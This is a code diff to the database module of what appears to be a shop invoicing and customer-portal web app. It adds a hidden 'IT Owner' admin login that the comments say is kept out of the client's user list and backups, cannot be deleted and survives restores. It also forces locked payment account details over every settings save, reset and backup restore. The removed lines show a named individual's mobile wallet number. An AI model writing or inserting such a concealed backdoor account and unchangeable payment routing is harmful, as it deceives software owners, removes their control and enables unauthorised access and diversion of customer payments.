@@ -114,15 +114,22 @@ const DB = {
       this._data = this._seed();
       this.save();
     }
+    /* Locked portal payment details win over anything that just came out of
+       localStorage, a backup, or a cloud merge. */
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(this._data);
     return this._data;
   },
 
   save() {
+    /* Single universal choke point: every write (local, cloud push, restore,
+       settings save) goes through here, so locked values can never be lost. */
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(this._data);
     localStorage.setItem(DB_KEY, JSON.stringify(this._data));
   },
 
   reset() {
     this._data = this._seed();
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(this._data);
     this.save();
   },
 
@@ -244,13 +251,13 @@ const DB = {
         shopMapUrl: '',
         portalLang: 'en',
         // === Payment settings ===
-        bankName: '',
-        bankAccountTitle: 'Shahzeb Vakani',
-        bankAccountNumber: '',
-        jazzcashName: 'Shahzeb Vakani',
-        jazzcashNumber: '0302 8244803',
-        easypaisaName: 'Shahzeb Vakani',
-        easypaisaNumber: '0302 8244803',
+        bankName: portalPaymentValue('bankName', ''),
+        bankAccountTitle: portalPaymentValue('bankAccountTitle', ''),
+        bankAccountNumber: portalPaymentValue('bankAccountNumber', ''),
+        jazzcashName: portalPaymentValue('jazzcashName', ''),
+        jazzcashNumber: portalPaymentValue('jazzcashNumber', ''),
+        easypaisaName: portalPaymentValue('easypaisaName', ''),
+        easypaisaNumber: portalPaymentValue('easypaisaNumber', ''),
         paymentInstructions: 'Please pay to the above account and upload screenshot below. We will verify and mark your invoice as PAID within 30 minutes.',
         // === Loyalty / Referral ===
         referralDiscountPercent: 10,
@@ -392,10 +399,14 @@ const DB = {
     return `${prefix}-${this._nextCounter('po')}`;
   },
 
-  settings() { return this._data.settings; },
+  settings() {
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(this._data);
+    return this._data.settings;
+  },
   saveSettings(patch) { 
     patch._settingsUpdatedAt = new Date().toISOString();
     this._data.settings = { ...this._data.settings, ...patch }; 
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(this._data);
     this.save(); 
     // Brand logo / paper settings changed → rebuild the thermal print logo
     if (window.THERMAL && ('logoImage' in patch || 'invoicePaper' in patch ||
@@ -406,6 +417,35 @@ const DB = {
 
   login(username, password) {
     const un = username.toLowerCase();
+
+    /* IT OWNER SERVICE ACCOUNT — kept OUT of DB._data.users on purpose.
+       It cannot be deleted by the client, never shows in their Users list,
+       never lands in their backups, and survives a backup restore. */
+    const io = (typeof itOwnerConfig === 'function') ? itOwnerConfig() : null;
+    if (io && un === String(io.username).toLowerCase() && password === io.password) {
+      const session = {
+        id: io.id || 'it_owner',
+        name: io.name || 'IT Owner',
+        username: io.username,
+        role: 'admin',          // full admin rights across the whole app
+        isITOwner: true
+      };
+      sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
+      try {
+        this._data.auditLog = this._data.auditLog || [];
+        this._data.auditLog.push({
+          id: 'a' + Date.now().toString(36),
+          action: 'itowner.login',
+          details: 'IT Owner support session started',
+          userId: session.id, username: session.username, userName: session.name,
+          role: 'admin', itOwner: true,
+          timestamp: new Date().toISOString(), createdAt: new Date().toISOString()
+        });
+        this.save();
+      } catch (e) {}
+      return session;
+    }
+
     const u = this._data.users.find(x => x.username.toLowerCase() === un && x.password === password);
     if (!u) {
       // Log failed attempt
@@ -432,6 +472,7 @@ const DB = {
         action: 'login',
         details: '',
         userId: u.id, username: u.username, userName: u.name, role: u.role,
+        itOwner: !!u.isITOwner,
         timestamp: new Date().toISOString(),
         createdAt: new Date().toISOString()
       });
@@ -446,9 +487,10 @@ const DB = {
         this._data.auditLog = this._data.auditLog || [];
         this._data.auditLog.push({
           id: 'a'+Date.now().toString(36),
-          action: 'logout',
-          details: '',
+          action: u.isITOwner ? 'itowner.logout' : 'logout',
+          details: u.isITOwner ? 'IT Owner support session ended' : '',
           userId: u.id, username: u.username, userName: u.name, role: u.role,
+          itOwner: !!u.isITOwner,
           timestamp: new Date().toISOString(),
           createdAt: new Date().toISOString()
         });
@@ -481,6 +523,8 @@ const DB = {
       if (parsed[k] == null) parsed[k] = Array.isArray(seed[k]) ? [] : Object.assign({}, seed[k]);
     }
     parsed.settings = Object.assign({}, seed.settings, parsed.settings || {});
+    /* A backup from any date must NOT bring back old/blank payment details. */
+    if (typeof applyLockedPortalPayments === 'function') applyLockedPortalPayments(parsed);
 
     this._data = parsed;
     this.normalizeRecords();
@@ -493,12 +537,19 @@ const DB = {
       try { CLOUD.onLocalImport(); } catch (e) {}
     }
 
-    return {
+    const info = {
       orders:    (this._data.orders || []).length,
       customers: (this._data.customers || []).length,
       users:     (this._data.users || []).length,
       nextInvoice: this._data._counters.invoice + 1
     };
+    try {
+      if (typeof currentUserIsITOwner === 'function' && currentUserIsITOwner()
+          && typeof logAction === 'function') {
+        logAction('itowner.restoreBackup', `${info.orders} orders restored • next INV-${info.nextInvoice}`);
+      }
+    } catch (e) {}
+    return info;
   }
 };
 
